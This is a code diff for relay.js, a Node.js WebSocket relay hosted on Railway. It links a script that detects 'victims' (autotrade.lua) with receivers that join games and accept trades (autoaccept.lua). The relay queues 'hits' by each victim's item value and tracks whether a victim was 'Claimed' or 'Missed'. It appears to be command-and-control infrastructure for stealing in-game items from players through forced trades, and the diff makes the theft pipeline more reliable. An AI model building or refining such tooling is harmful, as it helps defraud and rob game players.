@@ -1,19 +1,38 @@
 // ============================================================
 // relay.js  —  Cloud WebSocket relay (Railway)
 //
-// Changes in this version:
-//   - Hit queue is VALUE-SORTED (highest totalValue first).
-//     Ties broken by arrival time (earlier = higher priority).
-//   - Hits that arrive already Claimed or Missed are rejected
-//     immediately — never enter the queue.
-//   - New message type "status_update": autotrade.lua sends
-//     this whenever the victim's status changes. Relay:
-//       • Forwards it to all receivers so they can react
-//       • If the active job matches and status is Claimed or
-//         Missed, clears activeJob and dispatches next
-//       • If a queued job matches, removes it from the queue
-//   - Hit payload now carries: jobId, placeId, victimName,
-//     totalValue, status ("Waiting" at broadcast time)
+// Protocol participants:
+//   SENDER   = autotrade.lua  (detects victims, reports status)
+//   RECEIVER = autoaccept.lua (joins games, accepts trades)
+//
+// Message flow:
+//
+//   autotrade → relay:
+//     { type:"register", role:"sender", secret }
+//     { type:"hit", jobId, placeId, victimName, totalValue, status:"Waiting" }
+//     { type:"status_update", jobId, status, victimName, totalValue }
+//
+//   relay → autoaccept:
+//     { type:"registered", role:"receiver" }
+//     { type:"hit", jobId, placeId, victimName, totalValue, status, queuedAt }
+//     { type:"status_update", jobId, status, victimName, totalValue }
+//
+//   autoaccept → relay:
+//     { type:"register", role:"receiver", secret }
+//     { type:"receiver_ready" }            ← ready for next dispatch (after teleport lands)
+//     { type:"claimed", jobId }            ← trade complete
+//     { type:"skip", jobId }              ← skip this job, try next
+//
+//   relay → autotrade:
+//     { type:"registered", role:"sender" }
+//     { type:"hit_ack", jobId, queuePosition, totalValue }
+//     { type:"hit_ack", jobId, rejected:true, reason }
+//     { type:"claimed_ack", jobId }
+//
+// Queue: value-sorted descending. Ties broken by arrival time.
+// A receiver is only dispatched to when it is NOT busy.
+// Receiver becomes busy the moment a hit is dispatched.
+// Receiver becomes ready again via receiver_ready OR claimed OR skip.
 // ============================================================
 
 const { WebSocketServer } = require("ws");
@@ -24,17 +43,21 @@ const PORT   = parseInt(process.env.PORT || "8765", 10);
 
 // ── State ────────────────────────────────────────────────────
 const senders   = new Set();
-const receivers = new Set();
+const receivers = new Map();   // ws → { busy:bool, activeJobId:string|null }
 
 // Value-sorted queue — highest totalValue first.
 // Each entry: { jobId, placeId, victimName, totalValue, status, queuedAt }
 const hitQueue  = [];
-let   activeJob      = null;
-let   activeReceiver = null;
+let   activeJob      = null;    // currently-dispatched job (for status tracking)
+let   activeReceiver = null;    // ws of the receiver that got activeJob
 
 // ── HTTP server + health check ────────────────────────────────
 const server = http.createServer((req, res) => {
     if (req.method === "GET" && req.url === "/") {
+        const receiverList = [];
+        for (const [, info] of receivers) {
+            receiverList.push({ busy: info.busy, activeJobId: info.activeJobId });
+        }
         const status = {
             ok        : true,
             uptime    : Math.floor(process.uptime()),
@@ -51,7 +74,7 @@ const server = http.createServer((req, res) => {
                 status     : activeJob.status,
             } : null,
             senders   : senders.size,
-            receivers : receivers.size,
+            receivers : receiverList,
         };
         res.writeHead(200, { "Content-Type": "application/json" });
         res.end(JSON.stringify(status));
@@ -86,41 +109,72 @@ function enqueue(hit) {
     hitQueue.splice(i, 0, hit);
 }
 
-function dispatchNext() {
-    if (activeJob) return;
-    if (hitQueue.length === 0) return;
-    let target = null;
-    for (const r of receivers) {
-        if (r.readyState === 1) { target = r; break; }
+// Find a ready (connected + not busy) receiver
+function findFreeReceiver() {
+    for (const [ws, info] of receivers) {
+        if (ws.readyState === 1 && !info.busy) return ws;
     }
+    return null;
+}
+
+function dispatchNext() {
+    if (hitQueue.length === 0) return;
+
+    const target = findFreeReceiver();
     if (!target) {
-        log("RELAY", `Queue has ${hitQueue.length} hit(s) — waiting for receiver`);
+        const total = receivers.size;
+        const busy  = [...receivers.values()].filter(i => i.busy).length;
+        log("RELAY", `Queue has ${hitQueue.length} hit(s) — no free receiver (${busy}/${total} busy)`);
         return;
     }
-    activeJob      = hitQueue.shift();
+
+    const hit = hitQueue.shift();
+    activeJob      = hit;
     activeReceiver = target;
-    log("DISPATCH", `Job ${activeJob.jobId} (${activeJob.victimName} val:${activeJob.totalValue}) → receiver (${hitQueue.length} remaining)`);
-    send(target, { type: "hit", ...activeJob });
+
+    const info = receivers.get(target);
+    info.busy        = true;
+    info.activeJobId = hit.jobId;
+
+    log("DISPATCH", `Job ${hit.jobId} (${hit.victimName} val:${hit.totalValue}) → receiver (${hitQueue.length} remaining)`);
+    send(target, { type: "hit", ...hit });
 }
 
 // Broadcast a status_update to all receivers
 function broadcastStatusUpdate(jobId, status, victimName, totalValue) {
     const payload = { type: "status_update", jobId, status, victimName, totalValue };
-    for (const r of receivers) send(r, payload);
+    for (const [ws] of receivers) send(ws, payload);
     log("STATUS", `${jobId} → ${status} (${victimName}, val:${totalValue})`);
+}
+
+// Mark a receiver as free and optionally clear activeJob
+function freeReceiver(ws, jobId) {
+    const info = receivers.get(ws);
+    if (info) {
+        info.busy        = false;
+        info.activeJobId = null;
+    }
+    if (activeJob && activeJob.jobId === jobId) {
+        activeJob      = null;
+        activeReceiver = null;
+    }
 }
 
 // ── Heartbeat ─────────────────────────────────────────────────
 setInterval(() => {
-    for (const ws of [...senders, ...receivers]) {
+    const dead = [];
+    for (const ws of [...senders, ...receivers.keys()]) {
         if (!ws.isAlive) {
+            dead.push(ws);
             ws.terminate();
-            senders.delete(ws);
-            receivers.delete(ws);
             continue;
         }
         ws.isAlive = false;
         ws.ping();
+    }
+    for (const ws of dead) {
+        senders.delete(ws);
+        receivers.delete(ws);
     }
 }, 30_000);
 
@@ -158,10 +212,12 @@ wss.on("connection", (ws, req) => {
                 log("SENDER", `Registered from ${ip} (${senders.size} total)`);
                 send(ws, { type: "registered", role: "sender" });
             }
+
             if (msg.role === "receiver") {
-                receivers.add(ws);
+                receivers.set(ws, { busy: false, activeJobId: null });
                 log("RECEIVER", `Registered from ${ip} (${receivers.size} total)`);
                 send(ws, { type: "registered", role: "receiver" });
+                // Immediately try to dispatch a queued job to this new receiver
                 dispatchNext();
             }
             return;
@@ -173,14 +229,12 @@ wss.on("connection", (ws, req) => {
         if (msg.type === "hit" && ws.role === "sender") {
             const status = msg.status || "Waiting";
 
-            // Reject immediately if already terminal
             if (status === "Claimed" || status === "Missed") {
                 log("REJECT", `Hit ${msg.jobId} already ${status} — not queuing`);
                 send(ws, { type: "hit_ack", jobId: msg.jobId, rejected: true, reason: status });
                 return;
             }
 
-            // Require at least 1 value to be worth joining
             const val = typeof msg.totalValue === "number" ? msg.totalValue : 0;
             if (val < 1) {
                 log("REJECT", `Hit ${msg.jobId} value ${val} < 1 — not queuing`);
@@ -205,34 +259,31 @@ wss.on("connection", (ws, req) => {
         }
 
         // ── Status update (from autotrade.lua) ───────────────
-        // Autotrade sends this when status changes: Waiting→InProgress→Claimed/Missed/Partial
         if (msg.type === "status_update" && ws.role === "sender") {
             const { jobId, status, victimName, totalValue } = msg;
             log("STATUS_IN", `${jobId} → ${status}`);
 
-            // Forward to all receivers
             broadcastStatusUpdate(jobId, status, victimName, totalValue);
 
             const isTerminal = (status === "Claimed" || status === "Missed" || status === "Partial");
 
-            // If this is the active job going terminal, clear and dispatch next
+            // Active job went terminal — clear it
             if (activeJob && activeJob.jobId === jobId && isTerminal) {
                 log("TERMINAL", `Active job ${jobId} → ${status} — clearing`);
-                // Update status on active job for logging
+                const recv = activeReceiver;
                 activeJob.status = status;
-                activeJob = null;
-                activeReceiver = null;
+                freeReceiver(recv, jobId);
                 dispatchNext();
             }
 
-            // If a queued job goes terminal, remove it from queue
+            // Queued job went terminal — remove it
             const qi = hitQueue.findIndex(h => h.jobId === jobId);
             if (qi !== -1 && isTerminal) {
                 log("DEQUEUE", `Removing terminal job ${jobId} (${status}) from queue`);
                 hitQueue.splice(qi, 1);
             }
 
-            // Update status on queued job if not terminal (e.g. InProgress)
+            // Update status on queued job if still alive
             if (qi !== -1 && !isTerminal) {
                 hitQueue[qi].status = status;
             }
@@ -240,40 +291,73 @@ wss.on("connection", (ws, req) => {
             return;
         }
 
+        // ── Receiver ready (from autoaccept.lua) ─────────────
+        // Sent when the receiver has finished teleporting into the game
+        // and is ready for the relay to dispatch the NEXT job once it
+        // finishes handling the current one.  (Current job stays "active"
+        // until claimed/skip — this just marks it as the receiver being
+        // alive and operational, not blocked by teleport delay.)
+        // 
+        // Actually used to signal:  "I'm in-game now, keep me dispatched
+        // to this job — don't re-dispatch to me for another."
+        // In practice no action is needed because the receiver stays
+        // busy until claimed/skip arrives.  But we log it.
+        if (msg.type === "receiver_ready" && ws.role === "receiver") {
+            const info = receivers.get(ws);
+            log("RECV_READY", `Receiver in-game${info && info.activeJobId ? " for " + info.activeJobId : ""}`);
+            return;
+        }
+
         // ── Claimed (from autoaccept.lua) ─────────────────────
         if (msg.type === "claimed" && ws.role === "receiver") {
-            log("CLAIMED", `Job ${msg.jobId} complete`);
-            if (activeJob && activeJob.jobId === msg.jobId) {
-                activeJob = null; activeReceiver = null;
+            const jobId = msg.jobId;
+            log("CLAIMED", `Job ${jobId} complete`);
+
+            if (activeJob && activeJob.jobId === jobId) {
+                freeReceiver(ws, jobId);
             } else {
-                log("WARN", `claimed ${msg.jobId} != active ${activeJob?.jobId}`);
+                // Still free the receiver even if jobId mismatch
+                const info = receivers.get(ws);
+                if (info) { info.busy = false; info.activeJobId = null; }
+                log("WARN", `claimed ${jobId} != active ${activeJob?.jobId} — freed receiver anyway`);
             }
-            for (const s of senders) send(s, { type: "claimed_ack", jobId: msg.jobId });
+
+            for (const s of senders) send(s, { type: "claimed_ack", jobId });
             dispatchNext();
             return;
         }
 
         // ── Skip (from autoaccept.lua) ────────────────────────
-        // Skip does NOT requeue — just moves on to next
         if (msg.type === "skip" && ws.role === "receiver") {
-            log("SKIP", `Job ${msg.jobId} skipped — moving to next`);
-            if (activeJob && activeJob.jobId === msg.jobId) {
-                activeJob = null; activeReceiver = null;
+            const jobId = msg.jobId;
+            log("SKIP", `Job ${jobId} skipped`);
+
+            if (activeJob && activeJob.jobId === jobId) {
+                freeReceiver(ws, jobId);
+            } else {
+                const info = receivers.get(ws);
+                if (info) { info.busy = false; info.activeJobId = null; }
             }
+
             dispatchNext();
             return;
         }
     });
 
     ws.on("close", () => {
+        const wasActive = (ws === activeReceiver && activeJob);
+        const info      = receivers.get(ws);
+
         senders.delete(ws);
         receivers.delete(ws);
         log("DISCONNECT", `${ws.role || "unregistered"} from ${ip}`);
-        if (ws === activeReceiver && activeJob) {
-            log("RECOVERY", `Receiver dropped — pushing ${activeJob.jobId} back to front`);
-            // Re-insert at correct value position rather than forcing front
-            const recovered = { ...activeJob, queuedAt: Date.now() - 1_000_000 }; // old time = high priority
-            activeJob = null; activeReceiver = null;
+
+        // If the active receiver dropped mid-job, recover the job
+        if (wasActive) {
+            log("RECOVERY", `Receiver dropped — re-queueing ${activeJob.jobId}`);
+            const recovered = { ...activeJob, queuedAt: Date.now() - 1_000_000 };
+            activeJob      = null;
+            activeReceiver = null;
             enqueue(recovered);
             dispatchNext();
         }
